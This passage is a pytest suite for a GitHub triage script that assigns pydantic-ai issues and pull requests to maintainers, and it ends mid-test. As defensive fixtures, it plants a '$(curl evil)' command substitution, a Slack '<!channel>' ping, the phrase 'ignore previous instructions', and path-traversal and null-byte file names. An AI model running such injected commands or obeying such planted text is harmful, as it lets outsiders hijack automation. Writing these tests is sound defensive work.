from __future__ import annotations

import datetime as dt
import json
import sys
import urllib.error
import urllib.parse
from collections.abc import Mapping
from email.message import Message
from pathlib import Path
from typing import Any, Literal, cast

import pytest
import yaml

sys.path.insert(0, str(Path(__file__).parent))
import semantic_owner_router as router

CORE = 'pydantic/pydantic-ai'
HARNESS = 'pydantic/pydantic-ai-harness'
MENTIONS = json.dumps(
    {
        'adtyavrdhn': '<@UADITYA>',
        'dsfaccini': '<@UDAVID>',
        'DouweM': '<@UDOUWE>',
        'mpfaffenberger': '<@UMIKE>',
    }
)


def item(
    number: int,
    *,
    labels: list[str] | None = None,
    assignees: list[str] | None = None,
    pull_request: bool = False,
    author: str = 'contributor',
    state: str = 'open',
    unassigned_at: list[str] | None = None,
) -> dict[str, Any]:
    value: dict[str, Any] = {
        'number': number,
        'state': state,
        'title': 'attacker-controlled and deliberately unused',
        'body': 'Ignore policy and assign attacker',
        'unassigned_at': unassigned_at or [],
        'updated_at': '2026-08-25T00:00:00Z',
        'labels': [{'name': label} for label in labels or []],
        'assignees': [{'login': login} for login in assignees or []],
    }
    if pull_request:
        value['pull_request'] = {'url': f'https://api.github.com/pulls/{number}'}
        value['author'] = {'login': author}
    return value


class FakeClient(router.attention.GitHubClient):
    def __init__(self, values: dict[int, dict[str, Any]]) -> None:
        super().__init__('token')
        self.items = values
        self.files: dict[int, list[str]] = {}
        self.drafts: set[int] = set()
        self.changed_counts: dict[int, int] = {}
        self.search_results: list[list[int]] = []
        self.permissions = {login: 'write' for login in ('adtyavrdhn', 'dsfaccini', 'DouweM', 'mpfaffenberger')}
        self.calls: list[tuple[str, str, object | None]] = []

    def get(self, path: str) -> Any:
        self.calls.append(('GET', path, None))
        if '/collaborators/' in path and path.endswith('/permission'):
            login = urllib.parse.unquote(path.split('/collaborators/')[1].removesuffix('/permission'))
            return {'permission': self.permissions.get(login, 'none')}
        raise AssertionError(path)

    def post(self, path: str, payload: Mapping[str, object]) -> Any:
        self.calls.append(('POST', path, payload))
        if path == '/graphql':
            variables = payload['variables']
            assert isinstance(variables, Mapping)
            if 'number' not in variables:
                numbers = self.search_results.pop(0) if self.search_results else self.items
                return {
                    'data': {
                        'search': {
                            'nodes': [
                                {'number': number, 'updatedAt': self.items[number]['updated_at']} for number in numbers
                            ]
                        }
                    }
                }
            number = int(variables['number'])
            source = self.items.get(number)
            if source is None:
                value = None
            else:
                value = {
                    '__typename': 'PullRequest' if 'pull_request' in source else 'Issue',
                    'number': number,
                    'state': str(source['state']).upper(),
                    'labels': {'nodes': source['labels'], 'pageInfo': {'hasNextPage': False}},
                    'assignees': {
                        'nodes': source['assignees'],
                        'pageInfo': {'hasNextPage': False},
                    },
                }
                value['timelineItems'] = {'nodes': [{'createdAt': stamp} for stamp in source['unassigned_at']]}
                if 'pull_request' in source:
                    filenames = self.files.get(number, [])
                    value.update(
                        {
                            'isDraft': number in self.drafts,
                            'author': source['author'],
                            'changedFiles': self.changed_counts.get(number, len(filenames)),
                            'files': {
                                'nodes': [{'path': filename} for filename in filenames],
                                'pageInfo': {'hasNextPage': False},
                            },
                        }
                    )
            return {'data': {'repository': {'issueOrPullRequest': value}}}
        number = int(path.split('/issues/')[1].split('/')[0])
        requested = payload['assignees']
        assert isinstance(requested, list)
        existing = [str(entry['login']) for entry in self.items[number]['assignees']]
        self.items[number]['assignees'] = [{'login': login} for login in dict.fromkeys([*existing, *requested])]
        return self.items[number]


def test_repository_allowlist_is_exact():
    client = FakeClient({})

    with pytest.raises(ValueError, match='not allowlisted'):
        router.select_batch(client, 'attacker/repository')


def test_graphql_projection_never_requests_title_or_body():
    compact = ''.join(router._ITEM_QUERY.split()).casefold()

    assert 'title' not in compact
    assert 'body' not in compact


@pytest.mark.parametrize(
    ('permission', 'expected'),
    [
        ('write', ('adtyavrdhn', 'author:adtyavrdhn')),
        ('read', ('dsfaccini', 'path:pydantic_ai_slim/pydantic_ai/models/')),
    ],
)
def test_pr_author_precedence_requires_current_maintainer_permission(permission: str, expected: tuple[str, str]):
    client = FakeClient({7: item(7, pull_request=True, author='adtyavrdhn')})
    client.permissions['adtyavrdhn'] = permission
    client.files[7] = ['pydantic_ai_slim/pydantic_ai/models/openai.py']

    decision = router.decision_for(client, CORE, 7)['decision']

    assert decision is not None
    assert (decision['owner'], decision['evidence']) == expected


@pytest.mark.parametrize(
    ('repo', 'labels', 'expected'),
    [
        (CORE, ['streaming'], ('adtyavrdhn', 'label:streaming')),
        (CORE, ['MODEL ISSUE'], ('dsfaccini', 'label:model issue')),
        (CORE, ['AG-UI'], ('dsfaccini', 'label:AG-UI')),
        (CORE, ['vercel-ai'], ('dsfaccini', 'label:vercel-ai')),
        (CORE, ['web-ui'], ('dsfaccini', 'label:web-ui')),
        (CORE, ['durable exec'], ('DouweM', 'label:durable exec')),
        (HARNESS, ['cap:compaction'], ('mpfaffenberger', 'default:repo-intake')),
    ],
)
def test_exact_semantic_labels_route_to_fixed_owners(repo: str, labels: list[str], expected: tuple[str, str]):
    client = FakeClient({7: item(7, labels=[*labels, 'p:2-high'])})

    decision = router.decision_for(client, repo, 7)['decision']

    assert decision is not None
    assert (decision['owner'], decision['evidence']) == expected


@pytest.mark.parametrize('labels', [[], ['MCP'], ['p:3-mid'], ['p:4-low', 'streaming'], ['P:2-HIGH!']])
def test_issue_without_priority_label_stays_on_the_triage_plate(labels: list[str]):
    client = FakeClient({7: item(7, labels=labels, assignees=['DouweM'])})

    selected = router.decision_for(client, CORE, 7)

    assert selected == {'number': 7, 'decision': None, 'status': 'awaiting-triage'}
    assert not any('/collaborators/' in path for _, path, _ in client.calls)


def test_highest_priority_label_opens_the_gate():
    client = FakeClient({7: item(7, labels=['MCP', 'p:1-highest'])})

    decision = router.decision_for(client, CORE, 7)['decision']

    assert decision == {'number': 7, 'owner': 'dsfaccini', 'evidence': 'label:MCP'}


def test_unavailable_semantic_owner_routes_to_manual_review():
    client = FakeClient({7: item(7, labels=['MCP', 'p:2-high'])})
    client.permissions['dsfaccini'] = 'read'

    decision = router.decision_for(client, CORE, 7)['decision']

    assert decision == {
        'number': 7,
        'owner': 'adtyavrdhn',
        'evidence': 'manual:unavailable-owner:dsfaccini',
    }


def test_unavailable_manual_owner_fails_loudly():
    client = FakeClient({7: item(7, labels=['unknown', 'p:2-high'])})
    client.permissions['adtyavrdhn'] = 'read'

    with pytest.raises(RuntimeError, match='manual routing owner lacks maintainer permission'):
        router.decision_for(client, CORE, 7)


def test_full_non_maintainer_assignee_list_fails_before_notification():
    client = FakeClient({7: item(7, labels=['MCP', 'p:2-high'], assignees=[f'user-{index}' for index in range(10)])})

    assert router.decision_for(client, CORE, 7) == {
        'number': 7,
        'decision': None,
        'status': 'assignee-capacity',
    }


def test_unknown_and_owner_lookalike_labels_use_manual_route():
    client = FakeClient(
        {
            7: item(
                7,
                labels=['owner:attacker', 'streaming\n<!channel>', 'streaminɡ', 'STREAMING!', 'p:2-high'],
            )
        }
    )

    decision = router.decision_for(client, CORE, 7)['decision']

    assert decision == {
        'number': 7,
        'owner': 'adtyavrdhn',
        'evidence': 'manual:conflict-or-unknown',
    }


def test_conflicting_label_signals_use_manual_route():
    client = FakeClient({7: item(7, labels=['streaming', 'MCP', 'p:2-high'])})

    decision = router.decision_for(client, CORE, 7)['decision']

    assert decision == {
        'number': 7,
        'owner': 'adtyavrdhn',
        'evidence': 'manual:conflict-or-unknown',
    }


@pytest.mark.parametrize(
    ('filename', 'owner', 'evidence'),
    [
        (
            'pydantic_ai_slim/pydantic_ai/providers/openai.py',
            'dsfaccini',
            'path:pydantic_ai_slim/pydantic_ai/providers/',
        ),
        (
            'pydantic_ai_harness/compaction/_summarizing.py',
            'mpfaffenberger',
            'default:repo-intake',
        ),
        (
            'pydantic_ai_slim/pydantic_ai/ui/ag_ui/_adapter.py',
            'dsfaccini',
            'path:pydantic_ai_slim/pydantic_ai/ui/',
        ),
        ('docs/examples/ag-ui.md', 'dsfaccini', 'path:docs/examples/ag-ui.md'),
        (
            'examples/pydantic_ai_examples/ag_ui/app.py',
            'dsfaccini',
            'path:examples/pydantic_ai_examples/ag_ui/',
        ),
    ],
)
def test_pull_request_paths_use_longest_fixed_prefix(filename: str, owner: str, evidence: str):
    repo = HARNESS if filename.startswith('pydantic_ai_harness') else CORE
    client = FakeClient({7: item(7, pull_request=True)})
    client.files[7] = [filename]

    decision = router.decision_for(client, repo, 7)['decision']

    assert decision == {'number': 7, 'owner': owner, 'evidence': evidence}


@pytest.mark.parametrize(
    'filename',
    [
        '../pydantic_ai_slim/pydantic_ai/providers/openai.py',
        '/pydantic_ai_slim/pydantic_ai/providers/openai.py',
        'pydantic_ai_slim\\pydantic_ai\\providers\\openai.py',
        'pydantic_ai_slim/pydantic_ai/providers/\x00openai.py',
        'pydantic_ai_slim/pydantic_ai/providers_evil/openai.py',
    ],
)
def test_malformed_or_prefix_lookalike_paths_never_select_specialist(filename: str):
    client = FakeClient({7: item(7, pull_request=True)})
    client.files[7] = [filename]

    decision = router.decision_for(client, CORE, 7)['decision']

    assert decision is not None
    assert decision['owner'] == 'adtyavrdhn'
    assert decision['evidence'].startswith('manual:')


@pytest.mark.parametrize(
    'filename',
    [
        'pydantic_ai_slim/pydantic_ai/messages.py.attacker',
        'pydantic_ai_slim/pydantic_ai/_cancel.py.backdoor',
        'pydantic_ai_slim/pydantic_ai/mcp.py/evil',
    ],
)
def test_exact_file_rules_never_match_suffixes_or_children(filename: str):
    client = FakeClient({7: item(7, pull_request=True)})
    client.files[7] = [filename]

    decision = router.decision_for(client, CORE, 7)['decision']

    assert decision is not None
    assert decision['evidence'] == 'manual:unowned-production-path'


def test_provider_and_ui_files_share_davids_semantic_route():
    client = FakeClient({7: item(7, pull_request=True)})
    client.files[7] = [
        'pydantic_ai_slim/pydantic_ai/providers/openai.py',
        'pydantic_ai_slim/pydantic_ai/ui/ag_ui/_adapter.py',
    ]

    decision = router.decision_for(client, CORE, 7)['decision']

    assert decision is not None
    assert decision['owner'] == 'dsfaccini'
    assert decision['evidence'] == 'path:pydantic_ai_slim/pydantic_ai/providers/'


@pytest.mark.parametrize(
    'ui_path',
    [
        None,
        'pydantic_ai_slim/pydantic_ai/ui/ag_ui/_adapter.py',
        'docs/ui/ag-ui.md',
        'docs/api/ui/ag_ui.md',
        'docs/examples/ag-ui.md',
        'examples/pydantic_ai_examples/ag_ui/__main__.py',
    ],
)
def test_specific_ui_signal_routes_to_david_over_cross_cutting_streaming(ui_path: str | None):
    labels = ['streaming', 'AG-UI', 'p:2-high'] if ui_path is None else ['streaming']
    client = FakeClient({7: item(7, labels=labels, pull_request=ui_path is not None)})
    if ui_path is not None:
        client.files[7] = [ui_path]

    decision = router.decision_for(client, CORE, 7)['decision']

    assert decision is not None
    assert decision['owner'] == 'dsfaccini'
    if ui_path is None:
        assert decision['evidence'] == 'label:AG-UI'
    else:
        assert decision['evidence'].startswith('path:')


@pytest.mark.parametrize(
    ('labels', 'files'),
    [
        (['AG-UI', 'durable exec', 'p:2-high'], None),
        (
            [],
            [
                'pydantic_ai_slim/pydantic_ai/ui/ag_ui/_adapter.py',
                'pydantic_ai_slim/pydantic_ai/durable_exec/temporal.py',
            ],
        ),
    ],
)
def test_ui_and_durable_execution_remain_a_manual_conflict(labels: list[str], files: list[str] | None):
    client = FakeClient({7: item(7, labels=labels, pull_request=files is not None)})
    if files is not None:
        client.files[7] = files

    decision = router.decision_for(client, CORE, 7)['decision']

    assert decision is not None
    assert decision['owner'] == 'adtyavrdhn'
    assert decision['evidence'] == 'manual:conflict-or-unknown'


def test_known_and_unknown_production_paths_use_manual_route():
    client = FakeClient({7: item(7, pull_request=True)})
    client.files[7] = [
        'pydantic_ai_slim/pydantic_ai/providers/openai.py',
        'pydantic_ai_slim/pydantic_ai/unowned.py',
        'tests/models/test_openai.py',
    ]

    decision = router.decision_for(client, CORE, 7)['decision']

    assert decision is not None
    assert decision['evidence'] == 'manual:unowned-production-path'


def test_mike_is_not_selected_in_core_without_reviewed_ownership_evidence():
    client = FakeClient({7: item(7, labels=['tools'], pull_request=True)})
    client.files[7] = ['pydantic_ai_slim/pydantic_ai/toolsets/function.py']

    decision = router.decision_for(client, CORE, 7)['decision']

    assert decision == {
        'number': 7,
        'owner': 'adtyavrdhn',
        'evidence': 'manual:unowned-production-path',
    }


def test_every_harness_issue_routes_to_the_default_owner_without_a_priority_label():
    client = FakeClient({7: item(7, labels=['bug'])})

    selection = router.decision_for(client, HARNESS, 7)

    # Harness has no triage labeler, so its issues skip the priority gate and
    # go straight to the current blanket owner.
    assert selection['decision'] == {'number': 7, 'owner': 'mpfaffenberger', 'evidence': 'default:repo-intake'}


def test_every_harness_pull_request_routes_to_the_default_owner():
    client = FakeClient({7: item(7, pull_request=True)})
    client.files[7] = ['pydantic_ai_harness/code_mode/_runtime.py']

    decision = router.decision_for(client, HARNESS, 7)['decision']

    assert decision == {'number': 7, 'owner': 'mpfaffenberger', 'evidence': 'default:repo-intake'}


def test_harness_maintainer_authored_pull_request_keeps_author_precedence():
    client = FakeClient({7: item(7, pull_request=True, author='DouweM')})
    client.files[7] = ['pydantic_ai_harness/code_mode/_runtime.py']

    decision = router.decision_for(client, HARNESS, 7)['decision']

    assert decision == {'number': 7, 'owner': 'DouweM', 'evidence': 'author:DouweM'}


def test_harness_candidate_search_has_no_priority_filter():
    client = FakeClient({})
    client.search_results = [[], []]

    router.select_batch(client, HARNESS)

    issue_query = _search_queries(client)[0]
    assert 'label:' not in issue_query
    assert 'is:issue' in issue_query


def test_default_intake_notice_names_the_owner_without_a_slack_ping():
    payload = router._slack_payload(  # pyright: ignore[reportPrivateUsage]
        HARNESS,
        'Issue',
        router.Decision(number=7, owner='mpfaffenberger', evidence='default:repo-intake'),
        MENTIONS,
    )

    # Blanket intake must not ping the same person on every drained item.
    assert '<@UMIKE>' not in payload
    assert 'mpfaffenberger' in payload


@pytest.mark.parametrize('changed_count', [101, 2000])
def test_oversized_file_list_routes_to_manual_review(changed_count: int):
    client = FakeClient({7: item(7, pull_request=True)})
    client.changed_counts[7] = changed_count

    decision = router.decision_for(client, CORE, 7)['decision']

    assert decision is not None
    assert decision['evidence'] == 'manual:incomplete-file-list'


def test_incomplete_file_page_routes_to_manual_review():
    client = FakeClient({7: item(7, pull_request=True)})
    client.files[7] = ['pydantic_ai_slim/pydantic_ai/providers/openai.py']
    client.changed_counts[7] = 2

    decision = router.decision_for(client, CORE, 7)['decision']

    assert decision is not None
    assert decision['evidence'] == 'manual:incomplete-file-list'


def test_draft_pull_request_waits_until_ready():
    client = FakeClient({7: item(7, pull_request=True)})
    client.drafts.add(7)

    assert router.decision_for(client, CORE, 7) == {
        'number': 7,
        'decision': None,
        'status': 'draft',
    }


@pytest.mark.parametrize('is_draft', [None, 'false', 0, 1])
def test_malformed_draft_state_fails_closed(is_draft: object):
    client = FakeClient({7: item(7, pull_request=True)})
    original_post = client.post

    def post(path: str, payload: Mapping[str, object]) -> Any:
        result = original_post(path, payload)
        if path == '/graphql' and isinstance(result, dict):
            value = result['data']['repository']['issueOrPullRequest']
            value['isDraft'] = is_draft
        return result

    client.post = post  # type: ignore[method-assign]

    selected = router.decision_for(client, CORE, 7)

    assert selected['decision'] is None
    assert selected['status'] == 'invalid-draft-state'


@pytest.mark.parametrize('assignee', ['attacker', {}, {'login': None}, {'login': ''}])
def test_malformed_assignee_nodes_fail_closed(assignee: object):
    client = FakeClient({7: item(7, labels=['streaming', 'p:2-high'])})
    client.items[7]['assignees'] = [assignee]

    with pytest.raises(ValueError, match='malformed assignee'):
        router.decision_for(client, CORE, 7)

    assert not any(path.endswith('/assignees') for _, path, _ in client.calls)


def test_existing_maintainer_is_preserved_without_mutation():
    client = FakeClient({7: item(7, labels=['streaming', 'p:2-high'], assignees=['dsfaccini'])})

    selected = router.decision_for(client, CORE, 7)

    assert selected == {'number': 7, 'decision': None, 'status': 'maintainer-present'}
    assert not any(path.endswith('/assignees') for _, path, _ in client.calls)


def test_contributor_assignee_does_not_block_maintainer_assignment():
    client = FakeClient({7: item(7, labels=['MCP', 'p:2-high'], assignees=['contributor'])})
    expected = router.Decision(number=7, owner='dsfaccini', evidence='label:MCP')

    assert router.assign(client, CORE, expected) is True
    assert client.items[7]['assignees'] == [
        {'login': 'contributor'},
        {'login': 'dsfaccini'},
    ]
    assert sum(path.endswith('/assignees') for _, path, _ in client.calls) == 1


def test_assign_rechecks_policy_and_refuses_stale_decision():
    client = FakeClient({7: item(7, labels=['streaming', 'p:2-high'])})
    expected = router.Decision(number=7, owner='adtyavrdhn', evidence='label:streaming')
    client.items[7]['labels'] = [{'name': 'MCP'}, {'name': 'p:2-high'}]

    with pytest.raises(RuntimeError, match='evidence changed'):
        router.assign(client, CORE, expected)

    assert not any(path.endswith('/assignees') for _, path, _ in client.calls)


def test_assign_rechecks_current_owner_permission():
    class PermissionChangesClient(FakeClient):
        checks = 0

        def maintainer_login(self, repo: str, login: str, *, refresh: bool = False) -> str | None:
            if login == 'dsfaccini' and refresh:
                self.checks += 1
                return login if self.checks == 1 else None
            return super().maintainer_login(repo, login, refresh=refresh)

    client = PermissionChangesClient({7: item(7, labels=['MCP', 'p:2-high'])})
    expected = router.Decision(number=7, owner='dsfaccini', evidence='label:MCP')

    with pytest.raises(RuntimeError, match='no longer has maintainer permission'):
        router.assign(client, CORE, expected)


def test_assign_detects_permission_loss_after_the_write():
    class PermissionChangesClient(FakeClient):
        checks = 0

        def maintainer_login(self, repo: str, login: str, *, refresh: bool = False) -> str | None:
            if login == 'dsfaccini' and refresh:
                self.checks += 1
                return login if self.checks <= 2 else None
            return super().maintainer_login(repo, login, refresh=refresh)

    client = PermissionChangesClient({7: item(7, labels=['MCP', 'p:2-high'])})
    expected = router.Decision(number=7, owner='dsfaccini', evidence='label:MCP')

    with pytest.raises(RuntimeError, match='GitHub did not apply the selected owner'):
        router.assign(client, CORE, expected)

    assert client.items[7]['assignees'] == [{'login': 'dsfaccini'}]


def test_assign_detects_a_concurrent_maintainer_without_removing_anyone():
    class ConcurrentMaintainerClient(FakeClient):
        def post(self, path: str, payload: Mapping[str, object]) -> Any:
            if path.endswith('/assignees'):
                self.items[7]['assignees'].append({'login': 'DouweM'})
            return super().post(path, payload)

    client = ConcurrentMaintainerClient({7: item(7, labels=['MCP', 'p:2-high'])})
    expected = router.Decision(number=7, owner='dsfaccini', evidence='label:MCP')

    with pytest.raises(RuntimeError, match='concurrent maintainer assignment'):
        router.assign(client, CORE, expected)

    assert client.items[7]['assignees'] == [{'login': 'DouweM'}, {'login': 'dsfaccini'}]


def _search_queries(client: FakeClient) -> list[str]:
    return [
        str(cast(Mapping[str, object], payload['variables'])['query'])
        for method, path, payload in client.calls
        if method == 'POST'
        and path == '/graphql'
        and isinstance(payload, Mapping)
        and isinstance(payload.get('variables'), Mapping)
        and 'query' in cast(Mapping[str, object], payload['variables'])
    ]


def test_gated_selection_queries_exclude_every_fixed_owner():
    client = FakeClient({7: item(7, labels=['MCP', 'p:2-high']), 8: item(8, labels=['tools', 'p:1-highest'])})

    selected = router.select_batch(client, CORE)

    assert [selection['number'] for selection in selected] == [7, 8]
    negatives = '-assignee:adtyavrdhn -assignee:DouweM -assignee:dsfaccini -assignee:mpfaffenberger'
    assert _search_queries(client) == [
        f'repo:pydantic/pydantic-ai is:open is:issue label:"p:1-highest","p:2-high" {negatives} sort:created-asc',
        f'repo:pydantic/pydantic-ai is:open is:pr -draft:true created:>=2026-08-18 {negatives} sort:created-asc',
    ]


def test_gated_selection_is_bounded():
    client = FakeClient({number: item(number, labels=['MCP', 'p:2-high']) for number in range(1, 6)})

    selected = router.select_batch(client, CORE)

    assert [selection['number'] for selection in selected] == [1, 2, 3]


def test_gated_selection_does_not_exclude_an_offboarded_owner():
    client = FakeClient({7: item(7, labels=['MCP', 'p:2-high'], assignees=['dsfaccini'])})
    client.permissions['dsfaccini'] = 'read'

    selected = router.select_batch(client, CORE)[0]

    assert selected['decision'] == {
        'number': 7,
        'owner': 'adtyavrdhn',
        'evidence': 'manual:unavailable-owner:dsfaccini',
    }
    query = _search_queries(client)[0]
    assert '-assignee:dsfaccini' not in query
    assert '-assignee:adtyavrdhn' in query


def test_gated_selection_skips_non_routable_item_without_starving_the_next():
    client = FakeClient(
        {
            7: item(7, pull_request=True),
            8: item(8, labels=['MCP', 'p:2-high']),
        }
    )
    client.drafts.add(7)

    selected = router.select_batch(client, CORE)

    assert [selection['number'] for selection in selected] == [8]
    assert selected[0]['decision'] == {
        'number': 8,
        'owner': 'dsfaccini',
        'evidence': 'label:MCP',
    }


def test_gated_selection_skips_full_assignee_list_without_starving_the_next():
    client = FakeClient(
        {
            7: item(7, labels=['MCP', 'p:2-high'], assignees=[f'user-{index}' for index in range(10)]),
            8: item(8, labels=['MCP', 'p:2-high']),
        }
    )

    selected = router.select_batch(client, CORE)

    assert [selection['number'] for selection in selected] == [8]


def test_community_recovery_is_opt_in_second_choice_and_bounded():
    stale = {number: item(number, labels=['MCP', 'community-backed']) for number in range(1, 9)}
    client = FakeClient(stale)

    client.search_results = [[], []]
    assert router.select_batch(client, CORE) == []

    client.search_results = [[], [], [8]]
    assert [selection['number'] for selection in router.select_batch(client, CORE, community_recovery=True)] == [8]

    client.search_results = [[], [], list(range(1, 8))]
    selected = router.select_batch(client, CORE, community_recovery=True)
    assert [selection['number'] for selection in selected] == [1, 2, 3]

    community_queries = [query for query in _search_queries(client) if 'community-backed' in query]
    assert len(community_queries) == 2
    for query in community_queries:
        assert query == (
            'repo:pydantic/pydantic-ai is:open -draft:true no:assignee label:"community-backed" sort:updated-desc'
        )


def test_gated_routing_backs_off_after_a_recent_unassignment():
    recent = (dt.datetime.now(dt.timezone.utc) - dt.timedelta(days=2)).isoformat()
    client = FakeClient({7: item(7, labels=['MCP', 'p:1-highest'], unassigned_at=[recent])})

    selection = router.decision_for(client, CORE, 7)

    # A maintainer just removed the assignee; re-assigning the same owner six
    # hours later would fight that decision.
    assert selection == {'number': 7, 'decision': None, 'status': 'recently-unassigned'}
    assert router.select_batch(client, CORE) == []

    # The back-off protects pull requests the same way.
    pr_client = FakeClient({7: item(7, pull_request=True, author='adtyavrdhn', unassigned_at=[recent])})
    assert router.decision_for(pr_client, CORE, 7) == {
        'number': 7,
        'decision': None,
        'status': 'recently-unassigned',
    }


def test_community_recovery_backs_off_after_a_recent_unassignment():
    recent = (dt.datetime.now(dt.timezone.utc) - dt.timedelta(days=2)).isoformat()
    old = (dt.datetime.now(dt.timezone.utc) - dt.timedelta(days=30)).isoformat()
    stale = {
        8: item(8, labels=['MCP', 'community-backed'], unassigned_at=[old, recent]),
        9: item(9, labels=['MCP', 'community-backed'], unassigned_at=[old]),
    }
    client = FakeClient(stale)
    client.search_results = [[], [], [8, 9]]

    selected = router.select_batch(client, CORE, community_recovery=True)

    # A maintainer just took #8 off someone's plate; re-assigning it the next
    # morning would fight that correction. #9's unassignment is outside the
    # two-week window, so its neglect clock has run out again.
    assert [selection['number'] for selection in selected] == [9]


@pytest.mark.parametrize(('labels', 'routed'), [(['MCP', 'community-backed'], True), (['MCP'], False)])
def test_community_backed_label_opens_the_priority_gate(labels: list[str], routed: bool):
    client = FakeClient({7: item(7, labels=labels)})

    selected = router.decision_for(client, CORE, 7)

    if routed:
        assert selected['decision'] == {'number': 7, 'owner': 'dsfaccini', 'evidence': 'label:MCP'}
    else:
        assert selected == {'number': 7, 'decision': None, 'status': 'awaiting-triage'}


@pytest.mark.parametrize(
    'value',
    [
        '{}',
        json.dumps({'adtyavrdhn': '<!channel>'}),
        json.dumps({**json.loads(MENTIONS), 'attacker': '<@UATTACKER>'}),
        json.dumps({**json.loads(MENTIONS), 'DouweM': '<@D0A9U4K3CNM>'}),
        json.dumps({**json.loads(MENTIONS), 'adtyavrdhn': '<@UADITYA> injected'}),
    ],
)
def test_slack_map_rejects_missing_selected_owner_unknown_keys_and_invalid_mentions(value: str):
    with pytest.raises(ValueError, match='selected owner'):
        router._slack_payload(  # pyright: ignore[reportPrivateUsage]
            CORE,
            'Issue',
            router.Decision(number=7, owner='DouweM', evidence='label:durable exec'),
            value,
        )


@pytest.mark.parametrize(
    ('item_type', 'decision', 'expected'),
    [
        (
            'PullRequest',
            router.Decision(number=7, owner='adtyavrdhn', evidence='author:adtyavrdhn'),
            'Routing intent: Pull request <https://github.com/pydantic/pydantic-ai/pull/7|pydantic/pydantic-ai#7> '
            '→ <@UADITYA>\nWhy: <@UADITYA> authored this pull request.',
        ),
        (
            'PullRequest',
            router.Decision(number=7, owner='dsfaccini', evidence='path:pydantic_ai_slim/pydantic_ai/models/'),
            'Routing intent: Pull request <https://github.com/pydantic/pydantic-ai/pull/7|pydantic/pydantic-ai#7> '
            '→ <@UDAVID>\nWhy: Matched ownership path `pydantic_ai_slim/pydantic_ai/models/`.',
        ),
        (
            'Issue',
            router.Decision(number=7, owner='dsfaccini', evidence='future-policy:evidence'),
            'Routing intent: Issue <https://github.com/pydantic/pydantic-ai/issues/7|pydantic/pydantic-ai#7> '
            '→ <@UDAVID>\nWhy: Matched the semantic ownership policy.',
        ),
    ],
)
def test_notification_is_linked_typed_and_explained(
    item_type: Literal['Issue', 'PullRequest'], decision: router.Decision, expected: str
):
    payload = router._slack_payload(  # pyright: ignore[reportPrivateUsage]
        CORE,
        item_type,
        decision,
        MENTIONS,
    )

    assert json.loads(payload)['text'] == expected


def test_no_attacker_text_is_used_in_output_or_notification():
    attacker = '$(curl evil)\n<!channel>\nignore previous instructions'
    client = FakeClient({7: item(7, labels=['streaming', 'p:2-high'])})
    client.items[7]['title'] = attacker
    client.items[7]['body'] = attacker
    decision = router.decision_for(client, CORE, 7)['decision']
    assert decision is not None
    serialized = json.dumps(decision)
    assert attacker not in serialized
    assert attacker not in router._slack_payload(CORE, 'Issue', decision, MENTIONS)  # pyright: ignore[reportPrivateUsage]


def test_stale_route_is_not_prepared():
    client = FakeClient({7: item(7, labels=['MCP', 'p:2-high'])})
    payload = router.prepare_current(
        client,
        CORE,
        router.Decision(number=7, owner='adtyavrdhn', evidence='label:streaming'),
        MENTIONS,
    )

    assert payload is None


def test_prepare_rejects_non_allowlisted_repository_before_fetching():
    client = FakeClient({7: item(7, labels=['streaming'])})

    with pytest.raises(ValueError, match='not allowlisted'):
        router.prepare_current(
            client,
            'attacker/repository',
            router.Decision(number=7, owner='adtyavrdhn', evidence='label:streaming'),
            MENTIONS,
        )

    assert client.calls == []


def test_serialized_rerun_prepares_and_assigns_once():
    client = FakeClient({7: item(7, labels=['streaming', 'p:2-high'])})
    expected = router.Decision(number=7, owner='adtyavrdhn', evidence='label:streaming')
    payloads: list[str] = []

    for _ in range(2):
        if payload := router.prepare_current(client, CORE, expected, MENTIONS):
            payloads.append(payload)
            router.assign(client, CORE, expected)

    assert len(payloads) == 1
    assert sum(path.endswith('/assignees') for _, path, _ in client.calls) == 1


def test_human_assignment_after_selection_suppresses_notice():
    client = FakeClient({7: item(7, labels=['streaming', 'p:2-high'], assignees=['dsfaccini'])})
    payload = router.prepare_current(
        client,
        CORE,
        router.Decision(number=7, owner='adtyavrdhn', evidence='label:streaming'),
        MENTIONS,
    )

    assert payload is None
    assert not any(path.endswith('/assignees') for _, path, _ in client.calls)


def test_cli_modes_write_the_workflow_contract(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    output = tmp_path / 'github-output'
    client = FakeClient({7: item(7, labels=['streaming', 'p:2-high'])})
    monkeypatch.setattr(router.attention, 'GitHubClient', lambda token: client)
    monkeypatch.setenv('GITHUB_TOKEN', 'token')
    monkeypatch.setenv('GITHUB_REPOSITORY', CORE)
    monkeypatch.setenv('GITHUB_OUTPUT', str(output))
    monkeypatch.setenv('PYDANTIC_AI_TRIAGE_SLACK_MENTIONS', MENTIONS)
    monkeypatch.setenv('ROUTING_COMMUNITY_RECOVERY', '')
    monkeypatch.delenv('GITHUB_STEP_SUMMARY', raising=False)

    monkeypatch.setattr(sys, 'argv', ['semantic_owner_router.py', 'select'])
    assert router.main() == 0
    selected = dict(line.split('=', 1) for line in output.read_text().splitlines())
    assert selected == {
        'should_assign': 'true',
        'routes': '[{"number":7,"owner":"adtyavrdhn","evidence":"label:streaming"}]',
    }

    output.write_text('')
    args = ['--number', '7', '--owner', 'adtyavrdhn', '--evidence', 'label:streaming']
    monkeypatch.setattr(sys, 'argv', ['semantic_owner_router.py', 'prepare', *args])
    assert router.main() == 0
    prepared = dict(line.split('=', 1) for line in output.read_text().splitlines())
    assert prepared['should_notify'] == 'true'
    assert json.loads(prepared['slack_payload'])['text'].startswith('Routing intent:')

    output.write_text('')
    monkeypatch.setattr(sys, 'argv', ['semantic_owner_router.py', 'assign', *args])
    assert router.main() == 0
    assigned = dict(line.split('=', 1) for line in output.read_text().splitlines())
    assert assigned == {
        'did_assign': 'true',
        'number': '7',
        'owner': 'adtyavrdhn',
        'evidence': 'label:streaming',
    }


def test_cli_failure_is_redacted(monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]):
    monkeypatch.setattr(sys, 'argv', ['semantic_owner_router.py', 'select'])
    monkeypatch.delenv('GITHUB_TOKEN', raising=False)
    monkeypatch.delenv('GH_TOKEN', raising=False)

    assert router.main() == 1
    assert capsys.readouterr().err == 'owner routing failed: ValueError\n'


def test_cli_http_failure_reports_status_without_response_details(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
):
    def fail_client(_: str):
        raise urllib.error.HTTPError(
            'https://api.github.com/repos/pydantic/pydantic-ai/issues/7559/assignees?secret=value',
            403,
            'response details stay redacted',
            Message(),
            None,
        )

    monkeypatch.setattr(router.attention, 'GitHubClient', fail_client)
